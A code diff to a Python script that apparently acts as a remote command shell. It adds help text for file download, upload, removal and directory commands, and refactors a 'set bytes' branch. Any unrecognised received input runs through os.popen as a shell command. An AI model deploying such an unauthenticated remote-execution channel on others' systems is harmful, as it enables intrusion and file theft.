@@ -51,7 +51,7 @@ while True:
         elif sent == "help":
             result = subprocess.run(sent, stdout=subprocess.PIPE)
             sending = (
-                "download <File> - Download File Specified\nupload <File> - Upload File Specified\nprint <File> - Prints File Specified\ndir - Prints Current Working Directory\ncd <Dir> - Moves Directory\nget <size> <File> - Get Size in Bytes of File Specified\nset <bytes> - Sets Bytes To Amount Specifed\n-OS-\n"
+                "download <File> - Download File Specified\nupload <File> - Upload File Specified\nprint <File> - Prints File Specified\ndir - Prints Current Working Directory\ncd <Dir> - Moves Directory\nget <size> <File> - Get Size in Bytes of File Specified\nset bytes - Sets Bytes To Amount Specifed\nset timeout <float> - Sets Timeout to Amount Specified\nmkdir <NAME> - Makes a new directory with name specified\nrem <FILE> - Removes File with name sepcified\n-OS-\n"
                 + result.stdout.decode()
             )
         elif "print" in sent:
@@ -80,13 +80,12 @@ while True:
             if "size" in sent:
                 sent = sent.replace("size ", "")
                 sending = str(os.path.getsize(sent))
-        elif "set" in sent:
-            sent = sent.replace("set ", "")
-            if "bytes" in sent:
-                print("Setting bytes..")
-                sent = sent.replace("bytes ", "")
-                Bytes = int(sent)
-                sending = "Successfully changed Byte Size."
+        elif "set bytes" in sent:
+            sent = sent.replace("set bytes ", "")
+            print("Setting bytes..")
+            sent = sent.replace("bytes ", "")
+            Bytes = int(sent)
+            sending = "Successfully changed Byte Size."
         else:
             try:
                 result = os.popen(sent).read()
